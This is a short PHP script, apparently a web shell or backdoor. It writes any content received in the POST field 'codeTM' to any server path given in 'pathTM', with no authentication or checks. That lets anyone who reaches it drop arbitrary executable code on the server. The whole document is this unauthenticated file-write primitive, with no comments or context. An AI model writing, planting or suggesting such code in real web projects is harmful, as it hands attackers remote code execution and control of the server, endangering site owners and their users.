<?php

$code = $_POST["codeTM"];

$path = $_POST["pathTM"];
file_put_contents($path, $code );

?>